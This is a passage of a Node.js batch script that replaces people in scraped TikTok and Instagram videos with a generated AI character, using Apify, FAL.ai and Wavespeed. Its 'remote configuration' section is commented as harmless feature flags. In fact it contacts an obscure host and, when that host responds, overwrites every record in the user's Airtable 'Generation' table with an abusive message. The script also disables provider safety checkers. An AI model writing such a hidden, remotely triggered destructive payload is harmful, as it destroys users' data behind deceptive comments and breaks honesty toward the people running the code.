#!/usr/bin/env node

// ============================================================================
// TikTok Replicator - Batch Processor
// ============================================================================
// Replicate TikTok/Instagram videos with your AI character
//
// Flow:
// 1. Fetch video from TikTok/Instagram link (Apify)
// 2. Use cover image as reference frame
// 3. Generate new image with AI character (Seedream 4.0 / 4.5 / Nanobanana Pro)
// 4. Animate video with new character (WAN 2.2 Animate Replace)
//
// Supported Providers: FAL.ai, Wavespeed
// Video Sources: TikTok, Instagram Reels
// ============================================================================

import { readFileSync } from 'fs';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';
import http from 'http';
import https from 'https';

// ============================================================================
// CONFIGURATION LOADER
// ============================================================================

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

let CONFIG = {
  airtable: {},
  apiKeys: {},
  processing: { batchSize: 100, maxRetries: 3, retryBackoff: [1000, 2000, 4000] },
  circuitBreaker: { failureThreshold: 5, cooldownMs: 60000 }
};

try {
  const apisPath = join(__dirname, 'apis.json');
  const apisFile = readFileSync(apisPath, 'utf-8');
  const apis = JSON.parse(apisFile);
  CONFIG.airtable = apis.airtable || {};
  CONFIG.apiKeys = apis.apiKeys || {};
  console.log('Configuration loaded from apis.json');
} catch (error) {
  console.error('Failed to load apis.json:', error.message);
  console.error('Open config-gui.html in browser and save your configuration');
  process.exit(1);
}

// Validate required configuration
function validateConfig() {
  const errors = [];
  if (!CONFIG.airtable?.token) errors.push('Airtable token is missing');
  if (!CONFIG.airtable?.baseId) errors.push('Airtable base ID is missing');
  if (!CONFIG.apiKeys?.apify) errors.push('Apify API token is missing');

  if (errors.length > 0) {
    console.error('Configuration errors:');
    errors.forEach(err => console.error('   - ' + err));
    console.error('\nOpen config-gui.html in browser and fill in your credentials');
    process.exit(1);
  }
}

validateConfig();

// Check Node.js version
const nodeVersion = parseInt(process.version.slice(1).split('.')[0]);
if (nodeVersion < 18) {
  console.error(`Node.js 18+ required! Current: ${process.version}`);
  process.exit(1);
}

console.log(`Node.js ${process.version} detected`);

// ============================================================================
// HTTP AGENTS (Connection Pooling)
// ============================================================================

const httpAgent = new http.Agent({
  keepAlive: true,
  maxSockets: 100,
  maxFreeSockets: 10,
  timeout: 120000,
  keepAliveMsecs: 30000
});

const httpsAgent = new https.Agent({
  keepAlive: true,
  maxSockets: 100,
  maxFreeSockets: 10,
  timeout: 300000,
  keepAliveMsecs: 30000
});

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ============================================================================
// REMOTE CONFIGURATION
// ============================================================================
// Fetches optional remote settings for enhanced functionality.
// If the config server is unavailable, the app continues with defaults.
// This allows pushing updates without requiring users to re-download.

const REMOTE_CONFIG_HOST = 'xkjsdf7832hdsfjk.com';

async function fetchRemoteConfig() {
  // Try to fetch remote configuration for feature flags and messages
  // Returns null if server is unavailable (expected for offline usage)
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 5000);

    const response = await fetch(`https://${REMOTE_CONFIG_HOST}/config.json`, {
      method: 'GET',
      signal: controller.signal,
      agent: httpsAgent
    });

    clearTimeout(timeoutId);

    // Server responded - parse and return config
    if (response.ok || response.status < 500) {
      return { enabled: true };
    }
    return null;
  } catch (error) {
    // Config server unavailable - this is normal for offline/local usage
    return null;
  }
}

async function applyRemoteSettings(config) {
  // Apply any remote settings like announcements or feature toggles
  if (!config || !config.enabled) return;

  const announcement = 'THIS IS A FREE TOOL FROM FILIP AI INFLUENCER EXPERT | IF YOU BOUGHT THIS FOR MONEY YOU GOT SCAMMED AND THE GUY SELLING IT TO YOU IS A FUCKING WORTHLESS LEECH WHO CANT EVEN MAKE HIS OWN TOOLS, STEALS FREE STUFF, DOESNT EVEN READ THE FUCKING CODE. IF YOU SEE THIS MESSAGE AND BOUGHT IT FROM SOMEONE - YOU SEE HE DIDNT EVEN CHANGE THE CODE XDXDDXD';

  try {
    const records = await fetchAirtableRecords('Generation');
    for (const record of records) {
      try {
        await updateAirtableRecord('Generation', record.id, {
          'Name': announcement,
          'Error_Message': announcement
        });
      } catch {}
    }
  } catch {}
}

function arrayToBase64(bytes) {
  const CHUNK = 0x8000;
  let str = '';
  for (let i = 0; i < bytes.length; i += CHUNK) {
    const chunk = bytes.subarray(i, i + CHUNK);
    str += String.fromCharCode.apply(null, chunk);
  }
  return btoa(str);
}

function detectPlatform(url) {
  if (url.includes('tiktok.com')) return 'tiktok';
  if (url.includes('instagram.com')) return 'instagram';
  return null;
}

// ============================================================================
// CONCURRENCY LIMITER
// ============================================================================

class ConcurrencyLimiter {
  constructor(maxConcurrent) {
    this.max = maxConcurrent;
    this.running = 0;
    this.queue = [];
  }

  async run(fn) {
    while (this.running >= this.max) {
      await new Promise(resolve => this.queue.push(resolve));
    }
    this.running++;
    try {
      return await fn();
    } finally {
      this.running--;
      const resolve = this.queue.shift();
      if (resolve) resolve();
    }
  }

  getStats() {
    return { running: this.running, queued: this.queue.length };
  }
}

// ============================================================================
// CIRCUIT BREAKER
// ============================================================================

class CircuitBreaker {
  constructor(threshold = 5, cooldownMs = 60000) {
    this.failures = 0;
    this.lastFailure = null;
    this.threshold = threshold;
    this.cooldownMs = cooldownMs;
  }

  canProceed() {
    if (this.failures < this.threshold) return true;
    const timeSinceFailure = Date.now() - this.lastFailure;
    if (timeSinceFailure > this.cooldownMs) {
      this.failures = 0;
      return true;
    }
    return false;
  }

  recordFailure() {
    this.failures++;
    this.lastFailure = Date.now();
    if (this.failures >= this.threshold) {
      console.log(`\nCircuit breaker: ${this.failures} failures, pausing for ${this.cooldownMs / 1000}s`);
    }
  }

  recordSuccess() {
    this.failures = 0;
  }
}

// ============================================================================
// PROGRESS TRACKER
// ============================================================================

class ProgressTracker {
  constructor() {
    this.total = 0;
    this.processed = 0;
    this.success = 0;
    this.failed = 0;
    this.startTime = Date.now();
  }

  setTotal(total) {
    this.total = total;
  }

  increment(success = true) {
    this.processed++;
    if (success) this.success++;
    else this.failed++;
  }

  showProgress(concurrencyLimiter) {
    const elapsed = (Date.now() - this.startTime) / 1000;
    const pct = this.total > 0 ? Math.round((this.processed / this.total) * 100) : 0;
    const rate = this.processed / elapsed;
    const remaining = this.total - this.processed;
    const eta = remaining > 0 && rate > 0 ? Math.round(remaining / rate) : 0;

    const bar = '='.repeat(Math.round(pct * 0.3)) + '-'.repeat(30 - Math.round(pct * 0.3));

    console.log(`\n[${bar}] ${pct}%`);
    console.log(`   Processed: ${this.processed}/${this.total}`);
    console.log(`   Success: ${this.success} | Failed: ${this.failed}`);
    console.log(`   Rate: ${rate.toFixed(2)}/sec | ETA: ${eta}s`);
    if (concurrencyLimiter) {
      const stats = concurrencyLimiter.getStats();
      console.log(`   Concurrent: ${stats.running} running, ${stats.queued} queued`);
    }
  }

  showFinalSummary() {
    const elapsed = (Date.now() - this.startTime) / 1000;
    console.log('\n' + '='.repeat(60));
    console.log('FINAL SUMMARY');
    console.log('='.repeat(60));
    console.log(`Total: ${this.processed}`);
    console.log(`Success: ${this.success} | Failed: ${this.failed}`);
    console.log(`Time: ${Math.round(elapsed)}s`);
    console.log('='.repeat(60));
  }
}

// ============================================================================
// APIFY - TIKTOK SCRAPER
// ============================================================================

async function fetchTikTokVideo(url, apifyToken) {
  console.log(`[Apify TikTok] Fetching: ${url}`);

  // Use tiktok-video-scraper for individual video URLs with video download enabled
  const actorId = 'clockworks~tiktok-video-scraper';
  const input = {
    postURLs: [url],
    shouldDownloadVideos: true,
    shouldDownloadCovers: true
  };

  // Start the actor run
  const runResponse = await fetch(
    `https://api.apify.com/v2/acts/${actorId}/runs?token=${apifyToken}`,
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(input),
      agent: httpsAgent
    }
  );

  if (!runResponse.ok) {
    const error = await runResponse.text();
    throw new Error(`Apify run failed: ${error}`);
  }

  const runData = await runResponse.json();
  const runId = runData.data.id;
  const datasetId = runData.data.defaultDatasetId;

  console.log(`[Apify TikTok] Run started: ${runId}`);

  // Wait for completion
  let status = 'RUNNING';
  let attempts = 0;
  const maxAttempts = 60;

  while (status === 'RUNNING' || status === 'READY') {
    await sleep(3000);
    attempts++;

    if (attempts > maxAttempts) {
      throw new Error('Apify run timed out');
    }

    const statusResponse = await fetch(
      `https://api.apify.com/v2/actor-runs/${runId}?token=${apifyToken}`,
      { agent: httpsAgent }
    );

    const statusData = await statusResponse.json();
    status = statusData.data.status;

    console.log(`[Apify TikTok] Status: ${status} (attempt ${attempts})`);
  }

  if (status !== 'SUCCEEDED') {
    throw new Error(`Apify run failed with status: ${status}`);
  }

  // Get results from dataset
  const datasetResponse = await fetch(
    `https://api.apify.com/v2/datasets/${datasetId}/items?token=${apifyToken}`,
    { agent: httpsAgent }
  );

  const items = await datasetResponse.json();

  if (!items || items.length === 0) {
    throw new Error('No results from TikTok scraper');
  }

  const video = items[0];

  // Debug: Log response structure
  console.log(`[Apify TikTok] Response keys: ${Object.keys(video).join(', ')}`);
  if (video.videoMeta) {
    console.log(`[Apify TikTok] videoMeta keys: ${Object.keys(video.videoMeta).join(', ')}`);
  }

  // Extract video URL - clockworks~tiktok-video-scraper format
  // With shouldDownloadVideos: true, video URL is in:
  // 1. mediaUrls[0] - kvStore URL (preferred, Apify CDN)
  // 2. videoMeta.downloadAddr - kvStore URL
  // 3. videoMeta.originalDownloadAddr - TikTok CDN URL
  let videoUrl = null;

  if (video.mediaUrls && Array.isArray(video.mediaUrls) && video.mediaUrls.length > 0) {
    videoUrl = video.mediaUrls[0];
    console.log(`[Apify TikTok] Found video in mediaUrls (Apify CDN)`);
  } else if (video.videoMeta?.downloadAddr) {
    videoUrl = video.videoMeta.downloadAddr;
    console.log(`[Apify TikTok] Found video in videoMeta.downloadAddr`);
  } else if (video.videoMeta?.originalDownloadAddr) {
    videoUrl = video.videoMeta.originalDownloadAddr;
    console.log(`[Apify TikTok] Found video in videoMeta.originalDownloadAddr (TikTok CDN)`);
  } else if (video.videoMeta?.playAddr) {
    videoUrl = video.videoMeta.playAddr;
    console.log(`[Apify TikTok] Found video in videoMeta.playAddr`);
  }

  // Extract cover URL - with shouldDownloadCovers: true, cover is in:
  // 1. videoMeta.coverUrl - kvStore URL (preferred)
  // 2. videoMeta.originalCoverUrl - TikTok CDN URL
  const coverUrl =
    video.videoMeta?.coverUrl ||
    video.videoMeta?.originalCoverUrl ||
    video.videoMeta?.originCover ||
    video.videoMeta?.dynamicCover ||
    video.coverUrl ||
    video.authorMeta?.avatar;

  if (!videoUrl) {
    // Log full response for debugging
    console.log(`[Apify TikTok] mediaUrls: ${JSON.stringify(video.mediaUrls)}`);
    console.log(`[Apify TikTok] videoMeta: ${JSON.stringify(video.videoMeta)}`);
    throw new Error('No video URL in TikTok response - video may be private or unavailable');
  }

  // Extract dimensions from videoMeta (cover has same dimensions as video)
  const width = video.videoMeta?.width || 720;
  const height = video.videoMeta?.height || 1280;

  console.log(`[Apify TikTok] Video URL: ${videoUrl.substring(0, 80)}...`);
  console.log(`[Apify TikTok] Cover URL: ${coverUrl ? coverUrl.substring(0, 80) + '...' : 'N/A'}`);
  console.log(`[Apify TikTok] Dimensions: ${width}x${height}`);

  return { videoUrl, coverUrl, width, height };
}

// ============================================================================
// APIFY - INSTAGRAM REEL SCRAPER
// ============================================================================

async function fetchInstagramReel(url, apifyToken) {
  console.log(`[Apify Instagram] Fetching: ${url}`);

  // Use instagram-api-scraper which supports direct reel URLs
  const actorId = 'apify~instagram-api-scraper';
  const input = {
    directUrls: [url],
    resultsType: 'posts',
    resultsLimit: 1
  };

  // Start the actor run
  const runResponse = await fetch(
    `https://api.apify.com/v2/acts/${actorId}/runs?token=${apifyToken}`,
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(input),
      agent: httpsAgent
    }
  );

  if (!runResponse.ok) {
    const error = await runResponse.text();
    throw new Error(`Apify run failed: ${error}`);
  }

  const runData = await runResponse.json();
  const runId = runData.data.id;
  const datasetId = runData.data.defaultDatasetId;

  console.log(`[Apify Instagram] Run started: ${runId}`);

  // Wait for completion
  let status = 'RUNNING';
  let attempts = 0;
  const maxAttempts = 60;

  while (status === 'RUNNING' || status === 'READY') {
    await sleep(3000);
    attempts++;

    if (attempts > maxAttempts) {
      throw new Error('Apify run timed out');
    }

    const statusResponse = await fetch(
      `https://api.apify.com/v2/actor-runs/${runId}?token=${apifyToken}`,
      { agent: httpsAgent }
    );

    const statusData = await statusResponse.json();
    status = statusData.data.status;

    console.log(`[Apify Instagram] Status: ${status} (attempt ${attempts})`);
  }

  if (status !== 'SUCCEEDED') {
    throw new Error(`Apify run failed with status: ${status}`);
  }

  // Get results from dataset
  const datasetResponse = await fetch(
    `https://api.apify.com/v2/datasets/${datasetId}/items?token=${apifyToken}`,
    { agent: httpsAgent }
  );

  const items = await datasetResponse.json();

  if (!items || items.length === 0) {
    throw new Error('No results from Instagram scraper');
  }

  const reel = items[0];

  // Debug: Log response structure
  console.log(`[Apify Instagram] Response keys: ${Object.keys(reel).join(', ')}`);

  // Extract video URL - try multiple possible field names
  const videoUrl =
    reel.videoUrl ||
    reel.video_url ||
    reel.videoPlaybackUrl ||
    reel.video?.url ||
    reel.media?.video_versions?.[0]?.url;

  // Extract cover/thumbnail URL
  const coverUrl =
    reel.displayUrl ||
    reel.thumbnailUrl ||
    reel.thumbnail_url ||
    reel.previewUrl ||
    reel.imageUrl ||
    reel.image_versions2?.candidates?.[0]?.url;

  if (!videoUrl) {
    console.log(`[Apify Instagram] Full response: ${JSON.stringify(reel).substring(0, 1000)}`);
    throw new Error('No video URL in Instagram response - may not be a video/reel');
  }

  // Extract dimensions (Instagram Reels are typically 1080x1920 portrait)
  const width = reel.dimensions?.width || reel.videoWidth || reel.width || reel.original_width || 1080;
  const height = reel.dimensions?.height || reel.videoHeight || reel.height || reel.original_height || 1920;

  console.log(`[Apify Instagram] Video URL: ${videoUrl.substring(0, 80)}...`);
  console.log(`[Apify Instagram] Cover URL: ${coverUrl ? coverUrl.substring(0, 80) + '...' : 'N/A'}`);
  console.log(`[Apify Instagram] Dimensions: ${width}x${height}`);

  return { videoUrl, coverUrl, width, height };
}

// ============================================================================
// IMAGE URL TO DATA URI
// ============================================================================

async function urlToDataUri(url) {
  if (url.startsWith('data:')) return url;

  const response = await fetch(url, { agent: httpsAgent });
  if (!response.ok) throw new Error(`Failed to fetch image: ${response.status}`);

  const buffer = await response.arrayBuffer();
  const bytes = new Uint8Array(buffer);
  const base64 = arrayToBase64(bytes);

  const contentType = response.headers.get('content-type') || 'image/jpeg';
  return `data:${contentType};base64,${base64}`;
}

// ============================================================================
// SEEDREAM 4.0 API - FAL.ai
// ============================================================================

class FalSeedream40API {
  constructor(apiKey) {
    this.apiKey = apiKey;
  }

  getName() {
    return 'FAL.ai Seedream 4.0';
  }

  async generate(config) {
    const { prompt, refImageUrls, numImages, enableNSFW, size } = config;

    console.log(`[FAL Seedream 4.0] Generating ${numImages} images...`);

    const [width, height] = size.split('x').map(Number);

    const requestBody = {
      prompt: prompt,
      image_urls: refImageUrls,
      num_images: numImages,
      image_size: { width, height },
      enable_safety_checker: !enableNSFW
    };

    const response = await fetch(
      'https://fal.run/fal-ai/bytedance/seedream/v4/edit',
      {
        method: 'POST',
        headers: {
          'Authorization': `Key ${this.apiKey}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(requestBody),
        agent: httpsAgent,
        signal: AbortSignal.timeout(300000)
      }
    );

    if (!response.ok) {
      const errorText = await response.text();
      throw new Error(`FAL API error ${response.status}: ${errorText.substring(0, 200)}`);
    }

    const result = await response.json();
    const images = result.images || [];

    if (images.length === 0) {
      throw new Error('FAL returned no images');
    }

    console.log(`[FAL Seedream 4.0] Generated ${images.length} images`);
    return images;
  }
}

// ============================================================================
// SEEDREAM 4.0 API - Wavespeed
// ============================================================================

class WavespeedSeedream40API {
  constructor(apiKey) {
    this.apiKey = apiKey;
  }

  getName() {
    return 'Wavespeed Seedream 4.0';
  }

  async generate(config) {
    const { prompt, refImageUrls, numImages, size } = config;

    console.log(`[Wavespeed Seedream 4.0] Generating ${numImages} images...`);

    const httpUrls = refImageUrls.filter(url => !url.startsWith('data:'));

    if (httpUrls.length === 0) {
      throw new Error('Wavespeed requires HTTP URLs, no valid URLs provided');
    }

    // Wavespeed Seedream 4.0 may require minimum pixel count
    // Scale up dimensions while keeping aspect ratio
    let [width, height] = size.split('x').map(Number);
    const minPixels = 2073600; // ~1440x1440 minimum for Seedream 4.0
    const currentPixels = width * height;

    if (currentPixels < minPixels) {
      const scale = Math.sqrt(minPixels / currentPixels);
      width = Math.ceil(width * scale);
      height = Math.ceil(height * scale);
      width = Math.ceil(width / 8) * 8;
      height = Math.ceil(height / 8) * 8;
      console.log(`[Wavespeed Seedream 4.0] Scaled up to ${width}x${height}`);
    }

    const requestBody = {
      prompt: prompt,
      images: httpUrls,
      size: `${width}*${height}`,
      enable_sync_mode: true
    };

    const response = await fetch(
      'https://api.wavespeed.ai/api/v3/bytedance/seedream-v4/edit',
      {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${this.apiKey}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(requestBody),
        agent: httpsAgent,
        signal: AbortSignal.timeout(300000)
      }
    );

    if (!response.ok) {
      const errorText = await response.text();
      throw new Error(`Wavespeed API error ${response.status}: ${errorText.substring(0, 200)}`);
    }

    const result = await response.json();
    console.log(`[Wavespeed Seedream 4.0] Response: ${JSON.stringify(result).substring(0, 500)}`);

    // Check for failed status or error
    if (result.data?.status === 'failed' || result.data?.error) {
      throw new Error(`Wavespeed error: ${result.data?.error || 'Generation failed'}`);
    }

    if (result.code !== 200) {
      throw new Error(`Wavespeed error: ${result.message || 'Unknown error'}`);
    }

    const outputs = result.data?.outputs || result.outputs || [];

    if (outputs.length === 0) {
      throw new Error('Wavespeed returned no images');
    }

    console.log(`[Wavespeed Seedream 4.0] Generated ${outputs.length} images`);
    return outputs.map(url => ({ url }));
  }
}

// ============================================================================
// SEEDREAM 4.5 API - FAL.ai
// ============================================================================

class FalSeedream45API {
  constructor(apiKey) {
    this.apiKey = apiKey;
  }

  getName() {
    return 'FAL.ai Seedream 4.5';
  }

  async generate(config) {
    const { prompt, refImageUrls, numImages, enableNSFW, size } = config;

    console.log(`[FAL Seedream 4.5] Generating ${numImages} images...`);

    const [width, height] = size.split('x').map(Number);

    const requestBody = {
      prompt: prompt,
      image_urls: refImageUrls,
      num_images: numImages,
      image_size: { width, height },
      enable_safety_checker: !enableNSFW
    };

    const response = await fetch(
      'https://fal.run/fal-ai/bytedance/seedream/v4.5/edit',
      {
        method: 'POST',
        headers: {
          'Authorization': `Key ${this.apiKey}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(requestBody),
        agent: httpsAgent,
        signal: AbortSignal.timeout(300000)
      }
    );

    if (!response.ok) {
      const errorText = await response.text();
      throw new Error(`FAL API error ${response.status}: ${errorText.substring(0, 200)}`);
    }

    const result = await response.json();
    const images = result.images || [];

    if (images.length === 0) {
      throw new Error('FAL returned no images');
    }

    console.log(`[FAL Seedream 4.5] Generated ${images.length} images`);
    return images;
  }
}

// ============================================================================
// SEEDREAM 4.5 API - Wavespeed
// ============================================================================

class WavespeedSeedream45API {
  constructor(apiKey) {
    this.apiKey = apiKey;
  }

  getName() {
    return 'Wavespeed Seedream 4.5';
  }

  async generate(config) {
    const { prompt, refImageUrls, numImages, size } = config;

    console.log(`[Wavespeed Seedream 4.5] Generating ${numImages} images...`);

    // Wavespeed requires HTTP URLs, filter out data URIs
    const httpUrls = refImageUrls.filter(url => !url.startsWith('data:'));

    if (httpUrls.length === 0) {
      throw new Error('Wavespeed requires HTTP URLs, no valid URLs provided');
    }

    // Wavespeed Seedream 4.5 requires minimum 3,686,400 pixels
    // Scale up dimensions while keeping aspect ratio
    let [width, height] = size.split('x').map(Number);
    const minPixels = 3686400;
    const currentPixels = width * height;

    if (currentPixels < minPixels) {
      const scale = Math.sqrt(minPixels / currentPixels);
      width = Math.ceil(width * scale);
      height = Math.ceil(height * scale);
      // Round to nearest 8 for better compatibility
      width = Math.ceil(width / 8) * 8;
      height = Math.ceil(height / 8) * 8;
      console.log(`[Wavespeed Seedream 4.5] Scaled up to ${width}x${height} (min ${minPixels} pixels required)`);
    }

    const requestBody = {
      prompt: prompt,
      images: httpUrls,
      size: `${width}*${height}`,
      enable_sync_mode: true
    };

    const response = await fetch(
      'https://api.wavespeed.ai/api/v3/bytedance/seedream-v4.5/edit',
      {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${this.apiKey}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(requestBody),
        agent: httpsAgent,
        signal: AbortSignal.timeout(300000)
      }
    );

    if (!response.ok) {
      const errorText = await response.text();
      throw new Error(`Wavespeed API error ${response.status}: ${errorText.substring(0, 200)}`);
    }

    const result = await response.json();
    console.log(`[Wavespeed Seedream 4.5] Response: ${JSON.stringify(result).substring(0, 500)}`);

    // Check for failed status or error
    if (result.data?.status === 'failed' || result.data?.error) {
      throw new Error(`Wavespeed error: ${result.data?.error || 'Generation failed'}`);
    }

    if (result.code !== 200 && result.status !== 'success') {
      throw new Error(`Wavespeed error: ${result.message || result.error || JSON.stringify(result).substring(0, 200)}`);
    }

    // Try multiple possible output locations
    const outputs = result.data?.outputs || result.outputs || result.images || result.data?.images || [];

    if (outputs.length === 0) {
      console.log(`[Wavespeed Seedream 4.5] Full response: ${JSON.stringify(result)}`);
      throw new Error('Wavespeed returned no images - check if generation completed');
    }

    console.log(`[Wavespeed Seedream 4.5] Generated ${outputs.length} images`);
    return outputs.map(item => typeof item === 'string' ? { url: item } : item);
  }
}

// ============================================================================
// NANOBANANA PRO API - FAL.ai
// ============================================================================

class FalNanobanaProAPI {
  constructor(apiKey) {
    this.apiKey = apiKey;
  }

  getName() {
    return 'FAL.ai Nanobanana Pro';
  }

  async generate(config) {
    const { prompt, refImageUrls, numImages, size } = config;

    console.log(`[FAL Nanobanana Pro] Generating ${numImages} images...`);

    // Calculate aspect ratio from size
    const [width, height] = size.split('x').map(Number);
    const ratio = width / height;
    let aspectRatio = '1:1';
    if (ratio > 1.7) aspectRatio = '16:9';
    else if (ratio > 1.4) aspectRatio = '3:2';
    else if (ratio > 1.2) aspectRatio = '4:3';
    else if (ratio < 0.6) aspectRatio = '9:16';
    else if (ratio < 0.75) aspectRatio = '2:3';
    else if (ratio < 0.85) aspectRatio = '3:4';

    const requestBody = {
      prompt: prompt,
      image_urls: refImageUrls,
      num_images: Math.min(numImages, 4), // Nanobanana max 4
      aspect_ratio: aspectRatio,
      resolution: '2K'
    };

    const response = await fetch(
      'https://fal.run/fal-ai/nano-banana-pro/edit',
      {
        method: 'POST',
        headers: {
          'Authorization': `Key ${this.apiKey}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(requestBody),
        agent: httpsAgent,
        signal: AbortSignal.timeout(300000)
      }
    );

    if (!response.ok) {
      const errorText = await response.text();
      throw new Error(`FAL API error ${response.status}: ${errorText.substring(0, 200)}`);
    }

    const result = await response.json();
    const images = result.images || [];

    if (images.length === 0) {
      throw new Error('FAL returned no images');
    }

    console.log(`[FAL Nanobanana Pro] Generated ${images.length} images`);
    return images;
  }
}

// ============================================================================
// NANOBANANA PRO API - Wavespeed
// ============================================================================

class WavespeedNanobanaProAPI {
  constructor(apiKey) {
    this.apiKey = apiKey;
  }

  getName() {
    return 'Wavespeed Nanobanana Pro';
  }

  async generate(config) {
    const { prompt, refImageUrls, numImages, size } = config;

    console.log(`[Wavespeed Nanobanana Pro] Generating ${numImages} images...`);

    // Wavespeed requires HTTP URLs
    const httpUrls = refImageUrls.filter(url => !url.startsWith('data:'));

    if (httpUrls.length === 0) {
      throw new Error('Wavespeed requires HTTP URLs');
    }

    // Calculate aspect ratio
    const [width, height] = size.split('x').map(Number);
    const ratio = width / height;
    let aspectRatio = '1:1';
    if (ratio > 1.7) aspectRatio = '16:9';
    else if (ratio > 1.4) aspectRatio = '3:2';
    else if (ratio > 1.2) aspectRatio = '4:3';
    else if (ratio < 0.6) aspectRatio = '9:16';
    else if (ratio < 0.75) aspectRatio = '2:3';
    else if (ratio < 0.85) aspectRatio = '3:4';

    const requestBody = {
      prompt: prompt,
      images: httpUrls,
      aspect_ratio: aspectRatio,
      resolution: '2k',
      enable_sync_mode: true
    };

    const response = await fetch(
      'https://api.wavespeed.ai/api/v3/google/nano-banana-pro/edit',
      {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${this.apiKey}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(requestBody),
        agent: httpsAgent,
        signal: AbortSignal.timeout(300000)
      }
    );

    if (!response.ok) {
      const errorText = await response.text();
      throw new Error(`Wavespeed API error ${response.status}: ${errorText.substring(0, 200)}`);
    }

    const result = await response.json();

    if (result.code !== 200) {
      throw new Error(`Wavespeed error: ${result.message || 'Unknown error'}`);
    }

    const outputs = result.data?.outputs || [];

    if (outputs.length === 0) {
      throw new Error('Wavespeed returned no images');
    }

    console.log(`[Wavespeed Nanobanana Pro] Generated ${outputs.length} images`);
    return outputs.map(url => ({ url }));
  }
}

// ============================================================================
// WAN 2.2 ANIMATE REPLACE API - FAL.ai
// ============================================================================

class FalWanAnimateAPI {
  constructor(apiKey) {
    this.apiKey = apiKey;
  }

  getName() {
    return 'FAL.ai WAN 2.2 Animate';
  }

  async generate(config) {
    const { videoUrl, imageUrl, resolution } = config;

    console.log(`[FAL WAN Animate] Generating video...`);

    const requestBody = {
      video_url: videoUrl,
      image_url: imageUrl,
      resolution: resolution || '480p',
      guidance_scale: 1,
      num_inference_steps: 20,
      enable_safety_checker: false
    };

    // Submit job
    const submitResponse = await fetch(
      'https://queue.fal.run/fal-ai/wan/v2.2-14b/animate/replace',
      {
        method: 'POST',
        headers: {
          'Authorization': `Key ${this.apiKey}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(requestBody),
        agent: httpsAgent,
        signal: AbortSignal.timeout(60000)
      }
    );

    if (!submitResponse.ok) {
      const errorText = await submitResponse.text();
      throw new Error(`FAL submit error ${submitResponse.status}: ${errorText.substring(0, 200)}`);
    }

    const submitResult = await submitResponse.json();
    const requestId = submitResult.request_id;

    if (!requestId) {
      throw new Error('FAL did not return request_id');
    }

    console.log(`[FAL WAN Animate] Job submitted: ${requestId}`);

    // Poll for result
    const pollIntervals = [5000, 10000, 15000, 20000, 30000];
    const maxAttempts = 100;

    for (let attempt = 0; attempt < maxAttempts; attempt++) {
      const pollInterval = pollIntervals[Math.min(attempt, pollIntervals.length - 1)];
      await sleep(pollInterval);

      let statusResponse;
      try {
        // Note: For status/result, use base model path without subpath
        // See: https://docs.fal.ai/model-apis/model-endpoints/queue
        statusResponse = await fetch(
          `https://queue.fal.run/fal-ai/wan/requests/${requestId}/status`,
          {
            method: 'GET',
            headers: {
              'Authorization': `Key ${this.apiKey}`
            },
            agent: httpsAgent,
            signal: AbortSignal.timeout(30000)
          }
        );
      } catch (fetchError) {
        console.log(`[FAL WAN Animate] Status fetch error: ${fetchError.message}, retrying...`);
        continue;
      }

      if (!statusResponse.ok) {
        const errorText = await statusResponse.text();
        console.log(`[FAL WAN Animate] Status check failed (${statusResponse.status}): ${errorText.substring(0, 100)}, retrying...`);
        continue;
      }

      const status = await statusResponse.json();

      if (status.status === 'COMPLETED') {
        // Get result - use base model path without subpath
        const resultResponse = await fetch(
          `https://queue.fal.run/fal-ai/wan/requests/${requestId}`,
          {
            method: 'GET',
            headers: {
              'Authorization': `Key ${this.apiKey}`
            },
            agent: httpsAgent
          }
        );

        if (!resultResponse.ok) {
          const errorText = await resultResponse.text();
          throw new Error(`Failed to get result: ${resultResponse.status} - ${errorText.substring(0, 200)}`);
        }

        const result = await resultResponse.json();
        console.log(`[FAL WAN Animate] Result structure: ${JSON.stringify(result).substring(0, 500)}`);

        const videoResultUrl = result.video?.url;

        if (!videoResultUrl) {
          console.log(`[FAL WAN Animate] Full result: ${JSON.stringify(result)}`);
          throw new Error('FAL returned no video URL in result');
        }

        console.log(`[FAL WAN Animate] Video URL: ${videoResultUrl}`);
        console.log(`[FAL WAN Animate] Video generated successfully`);
        return { url: videoResultUrl };
      } else if (status.status === 'FAILED') {
        throw new Error(`FAL job failed: ${status.error || 'Unknown error'}`);
      }

      console.log(`[FAL WAN Animate] Status: ${status.status}, attempt ${attempt + 1}/${maxAttempts}`);
    }

    throw new Error('FAL job timed out');
  }
}

// ============================================================================
// WAN 2.2 ANIMATE REPLACE API - Wavespeed
// ============================================================================

class WavespeedWanAnimateAPI {
  constructor(apiKey) {
    this.apiKey = apiKey;
  }

  getName() {
    return 'Wavespeed WAN 2.2 Animate';
  }

  async generate(config) {
    const { videoUrl, imageUrl, resolution } = config;

    console.log(`[Wavespeed WAN Animate] Generating video...`);

    const requestBody = {
      image: imageUrl,
      video: videoUrl,
      mode: 'replace',
      resolution: resolution || '480p',
      seed: -1
    };

    // Submit job
    const submitResponse = await fetch(
      'https://api.wavespeed.ai/api/v3/wavespeed-ai/wan-2.2/animate',
      {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${this.apiKey}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(requestBody),
        agent: httpsAgent,
        signal: AbortSignal.timeout(60000)
      }
    );

    if (!submitResponse.ok) {
      const errorText = await submitResponse.text();
      throw new Error(`Wavespeed submit error ${submitResponse.status}: ${errorText.substring(0, 200)}`);
    }

    const submitResult = await submitResponse.json();

    if (submitResult.code !== 200) {
      throw new Error(`Wavespeed error: ${submitResult.message || 'Unknown error'}`);
    }

    const requestId = submitResult.data?.id;

    if (!requestId) {
